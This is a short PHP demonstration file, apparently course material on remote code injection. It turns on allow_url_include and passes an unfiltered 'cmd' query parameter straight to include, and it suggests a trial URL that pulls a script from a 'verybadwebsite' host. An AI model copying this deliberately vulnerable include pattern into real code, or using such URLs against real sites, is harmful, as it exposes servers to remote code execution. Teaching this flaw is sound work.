<?php
// FILE: prevent_remote_injection_php_ini.php

// preventing remote code injection attacks
// this demo simulates having the "allow_url_include" php.ini setting turned on
// the vulnerability exists when user input is mixed with one of the "include" commands

// simulates php.ini allow_url_* settings turned on
ini_set('allow_url_fopen', 1);
// NOTE: most recent PHP installations are compiled with allow_url_include disabled!
ini_set('allow_url_include', 1);

// initialize all variables
$header 	= '';
$content 	= 'Home';

// all input should be filtered and validated!!!
$command = (isset($_GET['cmd'])) ? $_GET['cmd'] : 'include/home.php';
include $command;
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Prevent Code Injection</title>
</head>
<body>
<h1>prevent_remote_injection_php_ini.php</h1>

<br />
<h3><?php echo htmlspecialchars($header); ?></h3>
<ul>
<li><a href="?cmd=include/home.php">HOME</a></li>
<li><a href="?cmd=include/add.php">ADD</a></li>
<li><a href="?cmd=include/edit.php">EDIT</a></li>
<li><a href="?cmd=include/delete.php">DELETE</a></li>
</ul>

<br />
Try this URL:
<pre>
prevent_remote_injection_php_ini.php?cmd=http://localhost/verybadwebsite/info.php
</pre>

<p>
<?php echo $content; ?>
</body>
</html>
